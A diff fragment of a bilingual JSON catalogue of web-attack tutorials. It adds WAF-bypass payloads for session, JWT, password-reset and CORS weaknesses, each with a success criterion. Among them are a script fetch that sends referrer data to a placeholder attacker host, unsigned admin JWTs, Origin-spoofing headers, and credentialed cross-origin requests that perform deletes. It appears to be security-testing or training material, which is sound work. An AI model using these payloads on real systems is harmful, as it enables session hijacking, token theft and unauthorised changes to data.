+        },
+        {
+          "title": {
+            "zh": "双 Referer 头",
+            "en": "Duplicate Referer Headers"
+          },
+          "command": "printf 'GET /login HTTP/1.1\\r\\nHost: 127.0.0.1:8080\\r\\nReferer: https://{ATTACKER_HOST}/?session=a\\r\\nReferer: https://site.invalid/\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 8080",
+          "description": {
+            "zh": "重复头拼接/覆盖差异携带注入参数过审。成功判据：注入 Referer 被解析。",
+            "en": "Duplicate-header concatenation/override smuggles the injected parameter past checks. Success: the injected Referer is parsed."
+          }
+        }
       ]
     },
     {
@@ -3492,8 +4492,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "会话 ID 熵",
-        "en": "Session ID Entropy"
+        "zh": "会话与 Cookie 劫持",
+        "en": "Session & Cookie Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -3560,7 +4560,42 @@
           "added-references",
           "defined-entropy-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "时间戳哈希样本",
+            "en": "Timestamp-Hash Samples"
+          },
+          "command": "md5_1700000001\nmd5_1700000002\nsha1_1700000001\n1700000001abc",
+          "description": {
+            "zh": "以时间戳派生前缀的样本检验熵来源是否可预测。成功判据：序列在多次采样间出现可推演规律。",
+            "en": "Timestamp-derived samples test whether entropy sources are predictable. Success: sequences show derivable patterns across samples."
+          }
+        },
+        {
+          "title": {
+            "zh": "截断哈希样本",
+            "en": "Truncated Hash Samples"
+          },
+          "command": "a1b2c3d4e5f6a7b8\n0123456789abcdef\nfeedfacecafebeef",
+          "description": {
+            "zh": "16 位截断形态检验会话 ID 有效熵长度。成功判据：生日碰撞空间可枚举。",
+            "en": "16-char truncated forms test the effective entropy length of session ids. Success: the birthday-collision space is enumerable."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码形态样本",
+            "en": "Encoded Form Samples"
+          },
+          "command": "YWFhYWFhYWFhYWFhYQ==\nMTIzNDU2Nzg5MGFiY2Q=\nNjY2NjY2NjY2NjY2Ng==",
+          "description": {
+            "zh": "base64 包裹的低熵串检验规范化前是否解码比较。成功判据：解码后与裸样本判定一致。",
+            "en": "base64-wrapped low-entropy strings test whether comparison happens after decode. Success: decoded forms judge identically to bare samples."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-referer-token",
@@ -3601,8 +4636,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Token 泄露",
-        "en": "Token Leakage"
+        "zh": "JWT 算法与令牌强度",
+        "en": "JWT Algorithms & Token Strength"
       },
       "tutorial": {
         "overview": {
@@ -3670,7 +4705,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "片段携带令牌",
+            "en": "Fragment-Carried Token"
+          },
+          "command": "Referer: https://{ATTACKER_HOST}/reset#access_token=LEAKED\nReferer: https://{ATTACKER_HOST}/#token=LEAKED",
+          "description": {
+            "zh": "令牌置于 URL 片段，目标站脚本读取并发起外链时泄露。成功判据：攻击者站收到片段内容。",
+            "en": "Token in the URL fragment leaks when target scripts read it and initiate outbound links. Success: the attacker site receives the fragment content."
+          }
+        },
+        {
+          "title": {
+            "zh": "端口与子域组合",
+            "en": "Port & Subdomain Combo"
+          },
+          "command": "Referer: https://sub.{ATTACKER_HOST}:8443/reset\nReferer: http://cdn.{ATTACKER_HOST}:8080/",
+          "description": {
+            "zh": "非常规端口与子域组合绕过精确域匹配的泄露监控。成功判据：外链请求到达攻击者主机。",
+            "en": "Unusual ports and subdomains bypass exact-domain leak monitoring. Success: outbound requests reach the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "多级路径变形",
+            "en": "Deep-Path Mutation"
+          },
+          "command": "Referer: https://{ATTACKER_HOST}/a/b/c/reset?next=/step2\nReferer: https://{ATTACKER_HOST}/reset/../reset/",
+          "description": {
+            "zh": "深路径与归一化变形绕过路径模式匹配的泄露检测。成功判据：泄露请求未被拦截。",
+            "en": "Deep paths and normalization mutations bypass path-pattern leak detection. Success: the leaking request is not blocked."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-password-reset-token",
@@ -3711,8 +4781,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "密码重置 Token",
-        "en": "Password-Reset Tokens"
+        "zh": "密码重置与恢复劫持",
+        "en": "Password Reset & Recovery Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -3784,6 +4854,41 @@
       "tags": [
         "auth2",
         "password_reset_token"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "长度边界扫描",
+            "en": "Length Boundary Scan"
+          },
+          "command": "token=0\ntoken=00\ntoken=000\ntoken=0000\ntoken=00000\ntoken=000000\ntoken=0000000\ntoken=00000000",
+          "description": {
+            "zh": "逐位补零扫描令牌长度边界与截断比较弱点。成功判据：特定长度出现校验行为跳变。",
+            "en": "Zero-padding scans for length boundaries and truncated-comparison weakness. Success: a validation jump appears at a specific length."
+          }
+        },
+        {
+          "title": {
+            "zh": "十六进制与十进制交替",
+            "en": "Hex-Decimal Swap"
+          },
+          "command": "token=0xff\ntoken=255\ntoken=0x1\ntoken=1\ntoken=0xdeadbeef\ntoken=3735928559",
+          "description": {
+            "zh": "进制形态差异绕过类型弱比较。成功判据：同一数值不同进制判定不一致。",
+            "en": "Radix differences bypass weak type comparisons. Success: the same value in different radixes judges inconsistently."
+          }
+        },
+        {
+          "title": {
+            "zh": "前导零变形",
+            "en": "Leading-Zero Variants"
+          },
+          "command": "token=000123\ntoken=0123\ntoken=123\ntoken=00123abc",
+          "description": {
+            "zh": "前导零触发数值/字符串转换比较差异。成功判据：变形值通过校验。",
+            "en": "Leading zeros trigger numeric/string conversion comparison divergence. Success: mutated values validate."
+          }
+        }
       ]
     },
     {
@@ -3825,8 +4930,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "JWT 传输泄露",
-        "en": "JWT Transport Leakage"
+        "zh": "令牌伪造与会话攻击",
+        "en": "Token Forgery & Session Attacks"
       },
       "tutorial": {
         "overview": {
@@ -3894,7 +4999,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：fragment 承载变体",
+            "en": "Header Mutation: Fragment Carrier Variant"
+          },
+          "command": "https://{TARGET}/oauth/callback#access_token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\nhttps://{TARGET}/oauth/callback#id_token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+          "description": {
+            "zh": "令牌放 URL fragment（#后不进服务器日志）验证前端 JS 仍会读取解析的泄露面；成功判据：浏览器端 JS 拿到并使用了令牌。",
+            "en": "Puts the token in the URL fragment (never server-logged) to verify client JS still parses it. Success: client-side JS picks up and uses the token."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：参数名轮换变体",
+            "en": "Header Mutation: Parameter Name Rotation"
+          },
+          "command": "?access-token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\n?session_state=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\n?auth=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+          "description": {
+            "zh": "轮换 access-token/session_state/auth 等参数名，绕过仅审计 access_token 参数的策略；成功判据：任一参数名被应用消费且进入日志/Referer。",
+            "en": "Rotates parameter names to bypass policies auditing only access_token. Success: some name is consumed by the app and leaks into logs or Referer."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：Referer 泄露验证变体",
+            "en": "Header Mutation: Referer Leak Verification"
+          },
+          "command": "https://{TARGET}/page?token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.<script>fetch('http://{ATTACKER_HOST}/leak?r='+encodeURIComponent(document.referrer))</script>",
+          "description": {
+            "zh": "构造带令牌 URL 被目标页面外链后经 Referer 外带，验证第三方资源加载泄露链；成功判据：{ATTACKER_HOST} 收到含令牌的 Referer。",
+            "en": "Triggers Referer exfiltration after the tokenized URL links out, verifying the third-party leak chain. Success: {ATTACKER_HOST} receives the Referer containing the token."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-token-ext",
@@ -3935,8 +5075,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Token 固定",
-        "en": "Token Fixation"
+        "zh": "JWT 算法与令牌强度",
+        "en": "JWT Algorithms & Token Strength"
       },
       "tutorial": {
         "overview": {
@@ -4003,7 +5143,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "多参数名并存",
+            "en": "Multi Parameter Names"
+          },
+          "command": "?access_token=&jwt=&auth_token=&bearer=&session_token=",
+          "description": {
+            "zh": "多参数名轮空值命中实现信任的通道。成功判据：任一空值通道进入认证。",
+            "en": "Empty values across many parameter names hit whichever channel the implementation trusts. Success: any empty channel enters authentication."
+          }
+        },
+        {
+          "title": {
+            "zh": "header+query 双通道",
+            "en": "Header+Query Dual Channel"
+          },
+          "command": "curl -sS --max-time 5 -H \"Authorization: Bearer attacker_token\" \"http://127.0.0.1:8080/api/marker?access_token=attacker_token\"",
+          "description": {
+            "zh": "双通道同值固定令牌，验证优先级实现固定注入。成功判据：服务端采信注入值。",
+            "en": "Fixing the token via both channels tests priority and enables injection. Success: the server honors the injected value."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码参数名",
+            "en": "Encoded Parameter Names"
+          },
+          "command": "?%74oken=attacker_token\n?%61ccess_token=attacker_token\n?%6Aw t=attacker_token",
+          "description": {
+            "zh": "编码参数名绕过黑名单键名匹配。成功判据：解码后被当作令牌来源。",
+            "en": "Encoded parameter names bypass key-name blacklists. Success: decoded keys are treated as token sources."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-token-token",
@@ -4044,8 +5219,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Token 熵与可预测性",
-        "en": "Token Entropy and Predictability"
+        "zh": "JWT 算法与令牌强度",
+        "en": "JWT Algorithms & Token Strength"
       },
       "tutorial": {
         "overview": {
@@ -4113,7 +5288,42 @@
           "added-references",
           "defined-statistical-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "毫秒粒度时间戳",
+            "en": "Millisecond Timestamps"
+          },
+          "command": "token=1700000000001\ntoken=1700000000002\ntoken=1700000000003\ntoken=1700000000004",
+          "description": {
+            "zh": "13 位毫秒粒度命中以毫秒源生成令牌的实现。成功判据：相邻值校验结果跳变或通过。",
+            "en": "13-digit millisecond values hit millisecond-sourced token generation. Success: adjacent values pass or validation jumps."
+          }
+        },
+        {
+          "title": {
+            "zh": "偏移窗口扫描",
+            "en": "Offset Window Scan"
+          },
+          "command": "token=1700000000\ntoken=1700000001\ntoken=1699999999\ntoken=1700000002\ntoken=1699999998",
+          "description": {
+            "zh": "前后 ±2 秒邻域扫描绕过宽时间窗校验。成功判据：窗口内任一值通过。",
+            "en": "A ±2s neighborhood scan exploits overly-wide time windows. Success: any value inside the window passes."
+          }
+        },
+        {
+          "title": {
+            "zh": "十六进制时间戳",
+            "en": "Hex Timestamps"
+          },
+          "command": "token=0x6551f100\ntoken=3f9a8b00\ntoken=0X6551F100",
+          "description": {
+            "zh": "hex 形态触发弱类型比较窗口。成功判据：hex 与十进制判定不一致。",
+            "en": "Hex forms trigger weak-comparison windows. Success: hex and decimal judge inconsistently."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-base64-token",
@@ -4154,8 +5364,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Token 完整性",
-        "en": "Token Integrity"
+        "zh": "JWT 算法与令牌强度",
+        "en": "JWT Algorithms & Token Strength"
       },
       "tutorial": {
         "overview": {
@@ -4223,7 +5433,42 @@
           "added-references",
           "clarified-base64-boundary"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "base64url 字母表变形",
+            "en": "base64url Alphabet Variant"
+          },
+          "command": "token=YWRtaW4-\ntoken=YWRtaW4_\ntoken=cm9vdA-\ntoken=dGVzdA_",
+          "description": {
+            "zh": "URL 安全字母表（-/_) 变形绕过字符集校验。成功判据：变形令牌仍被解码采信。",
+            "en": "URL-safe alphabet mutations bypass charset validation. Success: mutated tokens still decode and are honored."
+          }
+        },
+        {
+          "title": {
+            "zh": "去 padding 形态",
+            "en": "Padding-Stripped Form"
+          },
+          "command": "token=YWRtaW4\ntoken=cm9vdA\ntoken=dGVzdA\ntoken=dXNlcg",
+          "description": {
+            "zh": "去除 = 填充改变长度特征，宽松解码仍还原。成功判据：无 padding 值通过校验。",
+            "en": "Stripping = padding changes length signatures while lenient decoders still resolve. Success: padding-less values validate."
+          }
+        },
+        {
+          "title": {
+            "zh": "双重编码令牌",
+            "en": "Double-Encoded Token"
+          },
+          "command": "token=WVdSbWU0PQ==\ntoken=Y0c5emRHQmZkV0Yw",
+          "description": {
+            "zh": "二次 base64 在多层解码实现中还原。成功判据：双重编码值通过校验。",
+            "en": "A second base64 layer resolves in multi-decode implementations. Success: the double-encoded value validates."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-origin-ext",
@@ -4264,8 +5509,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "CORS Origin 反射",
-        "en": "CORS Origin Reflection"
+        "zh": "CORS 跨源配置攻击",
+        "en": "CORS Misconfiguration Attacks"
       },
       "tutorial": {
         "overview": {
@@ -4332,7 +5577,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "大小写混合反射",
+            "en": "Mixed-Case Reflection"
+          },
+          "command": "Origin: hTtPs://{ATTACKER_HOST}\nOrigin: https://{ATTACKER_HOST}\nOrigin: HTTPS://{ATTACKER_HOST}",
+          "description": {
+            "zh": "大小写混合命中大小写不敏感的反射逻辑。成功判据：ACAO 反射任意 Origin。",
+            "en": "Mixed case hits case-insensitive reflection logic. Success: ACAO reflects the arbitrary origin."
+          }
+        },
+        {
+          "title": {
+            "zh": "末尾点等价变形",
+            "en": "Trailing-Dot Equivalence"
+          },
+          "command": "Origin: https://{ATTACKER_HOST}.\nOrigin: https://sub.{TARGET}.",
+          "description": {
+            "zh": "末尾点域名与裸域解析等价但字符串不同。成功判据：反射头携带点号域并被浏览器接受。",
+            "en": "Trailing-dot domains resolve identically yet differ as strings. Success: the reflected dotted origin is accepted by browsers."
+          }
+        },
+        {
+          "title": {
+            "zh": "userinfo 前缀注入",
+            "en": "Userinfo Prefix Injection"
+          },
+          "command": "Origin: https://{TARGET}@{ATTACKER_HOST}\nOrigin: https://{ATTACKER_HOST}@{TARGET}",
+          "description": {
+            "zh": "@ 前后域名拼接欺骗 contains 型校验。成功判据：攻击者域被反射。",
+            "en": "Domains around @ fool contains-style validation. Success: the attacker domain is reflected."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-null-origin",
@@ -4373,8 +5653,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "CORS null Origin",
-        "en": "CORS null Origin"
+        "zh": "CORS 跨源配置攻击",
+        "en": "CORS Misconfiguration Attacks"
       },
       "tutorial": {
         "overview": {
@@ -4444,7 +5724,42 @@
           "added-references",
           "defined-browser-reachability"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "沙箱 iframe 组合变形",
+            "en": "Sandboxed iframe Combo"
+          },
+          "command": "<iframe sandbox=\"allow-scripts\" src=\"javascript:fetch('http://{TARGET}/account',{credentials:'include'})\"></iframe>",
+          "description": {
+            "zh": "不同 sandbox 标志组合仍产生 Origin: null 的跨源请求。成功判据：目标收到 null Origin 携带凭据请求。",
+            "en": "Different sandbox flag combinations still produce Origin: null cross-origin requests. Success: the target receives the credentialed null-origin request."
+          }
+        },
+        {
+          "title": {
+            "zh": "data: URI 触发",
+            "en": "data: URI Trigger"
+          },
+          "command": "<iframe src=\"data:text/html,<script>fetch('http://{TARGET}/account',{credentials:'include'})</script>\"></iframe>",
+          "description": {
+            "zh": "data: URI 文档的请求 Origin 序列化为 null。成功判据：null Origin 请求到达并被反射允许。",
+            "en": "Requests from data: URI documents serialize Origin as null. Success: the null-origin request arrives and is allowed by reflection."
+          }
+        },
+        {
+          "title": {
+            "zh": "重定向链产生 null",
+            "en": "Redirect-Chain Null Origin"
+          },
+          "command": "<script>location.href='http://{ATTACKER_HOST}/redirect?to=http://{TARGET}/account'</script>",
+          "description": {
+            "zh": "经 data: 或 sandbox 页中转的重定向链使最终请求 Origin 为 null。成功判据：目标收到 Origin: null 的凭据请求。",
+            "en": "A redirect chain relayed through data:/sandbox pages yields a null Origin on the final request. Success: the target receives the credentialed Origin: null request."
+          }
+        }
+      ]
     },
     {
       "id": "auth2--ext",
@@ -4485,8 +5800,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "CORS 子域白名单",
-        "en": "CORS Subdomain Allowlist"
+        "zh": "CORS 跨源配置攻击",
+        "en": "CORS Misconfiguration Attacks"
       },
       "tutorial": {
         "overview": {
@@ -4554,7 +5869,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "深层子域伪装",
+            "en": "Deep Subdomain Spoof"
+          },
+          "command": "Origin: https://a.b.c.{TARGET}\nOrigin: https://deep.nested.{TARGET}",
+          "description": {
+            "zh": "多层子域命中 endsWith 型白名单匹配。成功判据：深层子域被反射允许。",
+            "en": "Deep subdomains hit endsWith-style allowlist matching. Success: the deep subdomain is allowed and reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "连字符前缀混淆",
+            "en": "Hyphen-Prefix Confusion"
+          },
+          "command": "Origin: https://evil-{TARGET}\nOrigin: https://{TARGET}-evil\nOrigin: https://not{TARGET}",
+          "description": {
+            "zh": "连字符/直连前缀欺骗子串校验。成功判据：任一形态被接受反射。",
+            "en": "Hyphen/direct prefixes fool substring validation. Success: any form is accepted and reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写子域变形",
+            "en": "Case-Mutated Subdomain"
+          },
+          "command": "Origin: https://SUB.{TARGET}\nOrigin: https://Sub.{TARGET}\nOrigin: https://sub.{TARGET}",
+          "description": {
+            "zh": "大小写变形绕过小写归一化前的白名单比对。成功判据：变形子域被反射。",
+            "en": "Case mutations bypass allowlist comparisons applied before lowercasing. Success: the mutated subdomain is reflected."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-bypass-evil-target-com",
@@ -4595,8 +5945,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "CORS 正则校验",
-        "en": "CORS Regex Validation"
+        "zh": "CORS 跨源配置攻击",
+        "en": "CORS Misconfiguration Attacks"
       },
       "tutorial": {
         "overview": {
@@ -4704,8 +6054,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "CORS 来源信号一致性",
-        "en": "CORS Source-Signal Consistency"
+        "zh": "CORS 跨源配置攻击",
+        "en": "CORS Misconfiguration Attacks"
       },
       "tutorial": {
         "overview": {
@@ -4774,7 +6124,42 @@
           "added-references",
           "defined-browser-reachability"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双信号不一致组合",
+            "en": "Inconsistent Dual-Signal Combo"
+          },
+          "command": "curl -sS --max-time 5 -H \"Origin: null\" -H \"Referer: https://{TARGET}/settings\" http://{TARGET}/account",
+          "description": {
+            "zh": "Origin 为 null 而 Referer 为合法域的组合命中只校验单信号的逻辑。成功判据：凭据响应携带 ACAO: null。",
+            "en": "A null Origin with a legit Referer hits single-signal validation. Success: the credentialed response carries ACAO: null."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码 Referer 值",
+            "en": "Encoded Referer Value"
+          },
+          "command": "curl -sS --max-time 5 -H \"Origin: https://{ATTACKER_HOST}\" -H \"Referer: https://%74arget.example.invalid/path\" http://{TARGET}/account",
+          "description": {
+            "zh": "编码 Referer 在二次解码后命中白名单。成功判据：组合通过来源校验。",
+            "en": "The encoded Referer hits the allowlist after secondary decoding. Success: the pair passes origin validation."
+          }
+        },
+        {
+          "title": {
+            "zh": "端口与路径混淆",
+            "en": "Port & Path Confusion"
+          },
+          "command": "curl -sS --max-time 5 -H \"Origin: https://{ATTACKER_HOST}:443\" -H \"Referer: https://{ATTACKER_HOST}:443/path/\" http://{TARGET}/account",
+          "description": {
+            "zh": "显式 443 端口使字符串不同而语义相同。成功判据：组合被当作可信来源。",
+            "en": "An explicit :443 differs as a string while staying semantically identical. Success: the pair is treated as a trusted origin."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-cors",
@@ -4815,8 +6200,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "CORS 预检边界",
-        "en": "CORS Preflight Boundary"
+        "zh": "CORS 跨源配置攻击",
+        "en": "CORS Misconfiguration Attacks"
       },
       "tutorial": {
         "overview": {
@@ -4885,7 +6270,42 @@
           "added-references",
           "separated-csrf-and-cors-impact"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "text/plain 简单请求",
+            "en": "text/plain Simple Request"
+          },
+          "command": "fetch('http://{TARGET}/api/state-change', {method:'POST', headers:{'Content-Type':'text/plain'}, body:'{\"action\":\"delete\"}', credentials:'include'})",
+          "description": {
+            "zh": "text/plain 属 CORS 简单请求免预检，直发携凭据写操作。成功判据：状态变更生效且无预检发生。",
+            "en": "text/plain qualifies as a CORS simple request, sending the credentialed write without preflight. Success: the state changes with no preflight."
+          }
+        },
+        {
+          "title": {
+            "zh": "multipart 免预检写",
+            "en": "multipart Preflight-Free Write"
+          },
+          "command": "const fd = new FormData(); fd.append('action','delete'); fetch('http://{TARGET}/api/state-change', {method:'POST', body:fd, credentials:'include'})",
+          "description": {
+            "zh": "multipart/form-data 同属简单请求类型。成功判据：表单写操作成功执行。",
+            "en": "multipart/form-data is likewise a simple request type. Success: the form write executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "自定义头触发预检降级",
+            "en": "Custom-Header Preflight Downgrade"
+          },
+          "command": "curl -sS --max-time 5 -X OPTIONS -H \"Origin: https://{ATTACKER_HOST}\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: X-Ping\" http://{TARGET}/api/state-change",
+          "description": {
+            "zh": "携带非标准头触发预检并探测预检响应是否过宽放行。成功判据：预检响应 ACAO 反射攻击者域。",
+            "en": "A non-standard header forces a preflight that probes for overly permissive responses. Success: the preflight reflects the attacker origin in ACAO."
+          }
+        }
+      ]
     }
   ]
 }
